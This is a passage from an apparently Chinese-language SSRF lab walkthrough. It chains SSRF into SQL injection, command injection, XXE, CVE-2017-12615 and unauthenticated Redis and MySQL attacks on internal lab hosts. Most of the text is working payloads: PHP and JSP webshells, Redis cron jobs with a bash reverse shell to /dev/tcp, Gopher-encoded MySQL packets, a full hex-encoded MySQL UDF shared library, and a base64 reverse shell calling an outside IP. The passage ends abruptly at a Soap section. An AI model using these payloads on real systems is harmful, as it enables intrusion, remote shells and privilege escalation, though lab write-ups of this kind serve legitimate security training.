> 也可以采用BP的爆破插件Turbo Intruder;速度相当快但是准确度…不敢恭维
>
> 使用方法和常用脚本看[链接](http://shaoefan.cn/2021/06/02/burp-turbo-intruder-cha-jian/)

###  .22 学会内网目录爆破

通过SSRF爆破一下目录，这个时候可以试试上述的Trubo Intruder…看看上面链接就会

字典的话可用dirsearch的

6s就跑完了:joy:

![](https://p3.ssl.qhimg.com/t0131c0e613784eda78.png)

发现这是被人日过的站了，直接代码执行

![](https://p2.ssl.qhimg.com/t01357be95b1963a88d.png)

千万记得这个空格得二次编码…浏览器输入空格会变成+，自己改包手动变成空格再编码一次变成%20，同时得保证第一次解码后能被当做参数读取，所以再次编码

（不然哪有参数是cmd=cat /etc/hosts的，中间断开了是什么回事:laughing:)

![](https://p2.ssl.qhimg.com/t0169589574879ace0b.png)

命令执行成功！

![](https://p3.ssl.qhimg.com/t01d590d44fe3f76135.png)

###  .23 SQL注入

标准的基础SQL注入靶场=.=现在要通过ssrf去完成注入;空格要二次编码避免歧义

![](https://p4.ssl.qhimg.com/t01190d19ced3d5c1d5.png)

爆列数为4（直接带SSRF的网页输入，BP里写还得再一次编码…麻烦）

>
> [http://172.72.23.23:80/?id=1’%20order%20by%205–%20](http://172.72.23.23:80/?id=1'%20order%20by%205--%20)

![](https://p3.ssl.qhimg.com/t01b1ee633889264643.png)

爆信息（只有第3列不能回显，其他都行）

>
> [http://172.72.23.23:80/?id=-1’%20union%20select%20database(),user(),3,version()–%20](http://172.72.23.23:80/?id=-1'%20union%20select%20database\(\),user\(\),3,version\(\)--%20)

![](https://p3.ssl.qhimg.com/t010448dabf072273af.png)

爆表名

>
> [http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())–%20](http://172.72.23.23:80/?id=-1'%20union%20select%201,2,3,\(select%20group_concat\(table_name\)%20from%20information_schema.tables%20where%20table_schema=database\(\)\)--%20)

![](https://p3.ssl.qhimg.com/t0150d03c0bf0741a50.png)

爆字段

>
> [http://172.72.23.23:80/?id=-1’%20union%20select%201,2,3,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=’flag_is_here’)–%20](http://172.72.23.23:80/?id=-1'%20union%20select%201,2,3,\(select%20group_concat\(column_name\)%20from%20information_schema.columns%20where%20table_name='flag_is_here'\)--%20)

![](https://p2.ssl.qhimg.com/t01c2daf961b2bc9d30.png)

拿到Flag

![](https://p2.ssl.qhimg.com/t01122eec2368e7026a.png)

当然也可以写Shell（靶场的主人给网站目录开了777权限，可以直接写马了）

>
> [http://172.72.23.23:80/?id=-1’%20union%20select%20null,null,null](http://172.72.23.23:80/?id=-1'%20union%20select%20null,null,null),’<%3Fphp%20system($_GET[1]);%20%3F>’%20into%20dumpfile%20’/var/www/html/shell.php’—%20

从SSRF那个页面远程命令执行即可

![](https://p3.ssl.qhimg.com/t013928f7ad186df51f.png)

###  .24 命令执行

输入`http://172.72.23.24:80/`发现，是需要一个POST值的Web页面…这样就需要Gopher协议帮我们传递TCP数据流了

![](https://p5.ssl.qhimg.com/t0144e558ae3d4283f6.png)

而且这个需要POST值的页面其实是一个经典靶场，就是一个简单的Linux ping命令

比如ping(‘参数为ip的POST传输’)，这个时候你的参数传入ip=127.0.0.1;dir就能执行dir命令了

补一下Linux知识吧:

多个命令可以放在一行上，其执行情况得依赖于用在命令之间的分隔符。

**如果每个命令被一个分号 (;) 所分隔，那么命令会连续的执行下去，如** ：

> printf “%s/n” “This is executed” ; printf “%s/n” “And so is this”  
>  This is executed/nAnd so is this/n

**如果每个命令被 && 号分隔，那么这些命令会一直执行下去，如果中间有错误的命令存在，则不再执行后面的命令，没错则执行到完为止**：

> date && printf “%s/n” “The date command was successful”  
>  2021年 09月 09日 星期四 17:54:04 CST  
>  The date command was successful  
>  所有命令成功执行完毕。
>
> date && suck && printf “%s/n” “The date command was successful”  
>  2021年 09月 09日 星期四 17:57:21 CST
>
> Command ‘suck’ not found, but can be installed with:
>
> sudo apt install suck

后面的成功执行提示语句不会被输出，因为 suck 命令无法识别。

**如果每个命令被双竖线(||)分隔符分隔，如果命令遇到可以成功执行的命令，那么命令停止执行，即使后面还有正确的命令则后面的所有命令都将得不到执行。假如命令一开始就执行失败，那么就会执行
|| 后的下一个命令，直到遇到有可以成功执行的命令为止，假如所有的都失败，则所有这些失败的命令都会被尝试执行一次** ：

> date || ls / || date ‘duck!’ || uname -a  
>  2021年 09月 09日 星期四 17:56:06 CST

第一个命令成功执行！后面的所有命令不再得到执行。

> date ‘duck!’ || dakkk || uname -a  
>  date: 无效的日期”duck!”  
>  dakkk：未找到命令  
>  Linux wzf-virtual-machine 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17
> 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

首先构造一下Gopher包，随便找一个POST修改即可

> 千万记得删除Accept-Encoding选项，否则ssrf回显的时候会被gzip编码导致乱码

成品如下

![](https://p5.ssl.qhimg.com/t012d53bef2828ba2e5.png)

然后用之前我写的脚本二次编码（见Gopher章节）一下：

![](https://p2.ssl.qhimg.com/t01e6bbedad3660069d.png)

然后丢BP发送即可，这几个选项也是可以删的；Referer和Origin都是表示来源，Encoding必删影响回显

![](https://p3.ssl.qhimg.com/t01ea89922b23b565ec.png)

成品如下

![](https://p4.ssl.qhimg.com/t0158fa61fad2b7bf78.png)

###  .25 XML实体注入

一个基础的 XXE 外部实体注入场景（照搬XXE-Labs的….详情可以去打这个靶场）

![](https://p0.ssl.qhimg.com/t01de84c6d0804d3b62.png)

登录的时候用户提交的 XML 数据，且服务器后端对 XML 数据解析并将结果输出，所以可以构造一个 XXE 读取本地的敏感信息：

    
    
    POST /doLogin.php HTTP/1.1Host: 127.0.0.1Content-Length: 153Accept: application/xml, text/xml, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Content-Type: application/xml;charset=UTF-8Accept-Language: zh-CN,zh;q=0.9Connection: close<?xml version="1.0"?><!DOCTYPE GreatWan [<!ENTITY a SYSTEM  "file:///etc/hosts">]><user><username>&a;</username><password>admin</password></user>
    

然后用之前我写的脚本处理一下，丢包里面发送即可（记得删掉Encoding选项）

![](https://p2.ssl.qhimg.com/t01f2a3b71f275d5e8f.png)

成功读出Hosts文件~

![](https://p4.ssl.qhimg.com/t016cec2857f3ef16cb.png)

###  .26 CVE-2017-12615

Tomcat 中间件的 CVE-2017-12615
任意写文件漏洞，[详情](https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md)

还是一样，构造JSP一句话的PUT数据包

> PUT /shell.jsp/ HTTP/1.1  
>  Host: 127.0.0.1:8080  
>  Content-Length: 5  
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36  
>  Accept-Language: zh-CN,zh;q=0.9  
>  Connection: close
>
> <%  
>  String command = request.getParameter(“cmd”);  
>  if(command != null)  
>  {  
>  java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();  
>  int a = -1;  
>  byte[] b = new byte[2048];  
>  out.print(“<pre>“);  
>  while((a=in.read(b))!=-1)  
>  {  
>  out.println(new String(b));  
>  }  
>  out.print(“</pre>“);  
>  } else {  
>  out.print(“format: xxx.jsp?cmd=Command”);  
>  }  
>  %>

然后脚本处理，发出去；显示201就说明上传成功了（这个环境有BUG，无法命令执行；知道做法即可）

![](https://p5.ssl.qhimg.com/t01d7c5a0a0707ae2d0.png)

###  .27 Redis未授权

之前都是Gopher，这次换Dict吧，只不过一次只能写一次命令；该主机没开SSH，也没开80，只能写计划任务了

SSRF 传递的时候记得要把 `&` URL 编码为 `%26`，上面的操作最好再 BP 下抓包操作，防止浏览器传输的时候被 URL
打乱编码（这里BP的包空格不用设置%2520，不编码或者%20都可；因为dict协议不像gopher，原本接的就是命令）

    
    
    # 清空 keydict://172.72.23.27:6379/flushall# 设置要操作的路径为定时任务目录dict://172.72.23.27:6379/config set dir /var/spool/cron/# 在定时任务目录下创建 root 的定时任务文件dict://172.72.23.27:6379/config set dbfilename root# 写入 Bash 反弹 shell 的 payloaddict://172.72.23.27:6379/set x '\n\n*/1 * * * * bash -i >%26 /dev/tcp/X.X.X.X/X 0>%261\n\n'# 保存上述操作dict://172.72.23.27:6379/save
    

成功写入计划任务

![](https://p5.ssl.qhimg.com/t01b47ac2af23accc57.png)

成功反弹Shell！

![](https://p1.ssl.qhimg.com/t011f1b2fbd668f45f3.png)

###  .28 Redis有认证

Redis的密码一般放在配置文件，常见路径如下

    
    
    /etc/redis.conf/etc/redis/redis.conf/usr/local/redis/etc/redis.conf/opt/redis/ect/redis.conf
    

其实这个内网服务器还开了80端口的….而且还是个文件包含，所以这是个标准的LFI文件包含漏洞

![](https://p3.ssl.qhimg.com/t01c33a6e36866ace05.png)

本关卡Redis还加了认证，不能直接执行命令

![](https://p5.ssl.qhimg.com/t01b34157559a3a9b18.png)

所以一个个配置路径试，最终在`http://172.72.23.28/?file=/etc/redis.conf`找到了密码

![](https://p1.ssl.qhimg.com/t0154cc2bf633b89afd.png)

最后用之前写的Redis未授权写Webshell的脚本生成Gopher数据流，发送即可（这里没有返回包的）

![](https://p4.ssl.qhimg.com/t017f2173d14f297a1e.png)

然后就能代码执行啦~

![](https://p0.ssl.qhimg.com/t01736e617d35b51bb1.png)

###  .29 MySQL未授权

（可以直接用上面章节介绍的Gopherus生成gopher数据，这里重在讲原理）

Mysql通信协议看[链接](https://paper.seebug.org/510/)；没必要搞太懂，知道其他关系型数据库的未授权访问攻击和MySQL做法一样的即可

首先得获取到和mysql交流的数据包,自己本地Linux模拟一下：

先开个端口监听抓取数据包

    
    
    # lo 回环接口网卡 -w 报错 pcapng 数据包tcpdump -i lo port 3306 -w mysql.pcapng
    

然后输入语句，获取到Flag

    
    
    mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
    

![](https://p3.ssl.qhimg.com/t0195507eb123d22f42.png)

关掉tcpdump；随后在Wireshark打开流量包，选个包右键->追踪TCP流，然后找到我们发给3306的TCP流，导出原始数据（其实就是一堆十六进制）

![](https://p2.ssl.qhimg.com/t010c6dff4882a24330.png)

写个脚本，生成Gopher数据：

    
    
    import urllib.parseimport retemp=""with open("Result.txt","r") as f:    for line in f.readlines():        temp+=line.strip('\n')a=[temp[i:i+2] for i in range(0,len(temp),2)]result="gopher://172.72.23.29:3306/_%"+"%".join(a)print(urllib.parse.quote(result))
    

熟悉吧~然后打出去就好了

>
> gopher%3A//172.72.23.29%3A3306/_%25a1%2500%2500%2501%2585%25a2%253f%2500%2500%2500%2500%2501%2508%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2564%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2503%2534%2530%2530%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2536%252e%2535%2531%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2521%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256f%256e%255f%2563%256f%256d%256d%2565%256e%2574%2520%256c%2569%256d%2569%2574%2520%2531%253d%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%252e%2574%2565%2573%2574%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2575%2573%2565%2572%2528%2529%252c%2527%2577%2577%2577%252e%2573%2571%256c%2573%2565%2563%252e%2563%256f%256d%2527%2501%2500%2500%2500%2501

![](https://p5.ssl.qhimg.com/t01f9d475d14a8fce1b.png)

###  .29额外 MySQL UDF提权

MySQL提权专题详细见国光师傅这个[链接](https://www.sqlsec.com/2020/11/mysql.html)，这里只讲SSRF细节

首先得找插件目录，依旧先本地Linux模拟，找到发送的数据包：

本地tcpdump监听抓取数据包

    
    
    tcpdump -i lo port 3306 -w mysql.pcapng
    

执行命令

    
    
    mysql -h127.0.0.1 -uroot -e "show variables like '%plugin%';"
    

![](https://p5.ssl.qhimg.com/t011e0828683f480296.png)

然后生成的流量包丢给Wireshark，追踪TCP流，筛选发给3306的，勾原始数据选项

![](https://p4.ssl.qhimg.com/t01fd498669b277bb6d.png)

通过SSRF打过去即可，成功回显插件路径

![](https://p3.ssl.qhimg.com/t012fb0de7e81a0a416.png)

老样子，还得本地模拟监听抓取数据包，再通过SSRF的Gopher写入so；

因为命令太长，先登录

> mysql -h127.0.0.1 -uroot

然后写进去，动态链接库地址可以看[链接](https://www.sqlsec.com/tools/udf.html)，这里用64位的可以成功

> SELECT
> 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000
> INTO DUMPFILE ‘/usr/lib/mysql/plugin/udf.so’;

得到数据包后，和之前一样的做法，不再赘述

用脚本处理完通过SSRF发出去，可能一直显示Wait，但是已经写进去了

![](https://p3.ssl.qhimg.com/t019b81ed227fe0fdfa.png)

![](https://p4.ssl.qhimg.com/t0143cd0a22dca4fd17.png)

还是一样，再次本地Liunx模拟一下：

这里一定要先登录再写命令，不然tcpdump抓不到包…巨坑:cry:

    
    
    mysql -h127.0.0.1 -uroot
    

创建自定义函数（参考你导入的动态链接库支持哪些自定义函数）

    
    
    CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';
    

在这个[链接](https://www.sqlsec.com/tools.html)JS编码一下命令，bash1的编码不行就换bash2

![](https://p2.ssl.qhimg.com/t01c8f4a4a9137a9d0d.png)

然后再去执行

    
    
    select sys_eval('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuNjAuMjgvMjMzMyAwPiYx|base64 -d|bash -i');
    

反弹成功！

![](https://p2.ssl.qhimg.com/t01529529e141935dba.png)

![](https://p2.ssl.qhimg.com/t01b4cd1bd45eb90b2c.png)

说明本地使用是没问题的；那么现在抓到流量包后，再放到SSRF里去Gopher：

![](https://p4.ssl.qhimg.com/t0175fca03be5def13e.png)

一定得要有命令执行再继续操作….别不带脑子搞:joy:反弹成功~

![](https://p4.ssl.qhimg.com/t01c3687c4f3276fd48.png)

###  后话

[国光的SSRF靶场](https://www.sqlsec.com/2021/05/ssrf.html#toc-heading-1)

[不详细的未授权访问总结](https://xz.aliyun.com/t/6103#toc-1)

## Soap+Session反序列化+CRLF

推荐先去这个[链接](https://www.w3school.com.cn/soap/index.asp)了解一下Soap和WebServices，这个[链接](http://staff.ustc.edu.cn/~shizhu/DotNet/WSDLxj.htm)系统性学习WSDL+Soap；不必研究过深，我们不折腾开发的标准化:joy_cat:

Session反序列化相关知识和漏洞见我的笔记

简而言之

  * WebServices用作任何平台、任何语言之间的网络交互，是一种标准，或者说方法
  * 具体的实现依靠WSDL文档（也可以没有）+Soap协议，客户端和服务器端共享一份WSDL文档，其中包含了双方沟通所需要的操作（函数）声明、操作（函数）参数、命名空间等等；相当于一份双方合同
  * Soap协议是建立在HTTP协议+XML格式的数据包上的

可能你实在看不懂，那就看下面的理解一下吧~

###  无WSDL的Soap通信

开两台虚拟机，客户端192.168.0.138，服务端192.168.0.131；实验前记得两边的PHP开启Soap扩展，phpinfo能查询到

该例子来源于[菜鸟教程](https://www.runoob.com/webservices/ws-example.html)

    
    
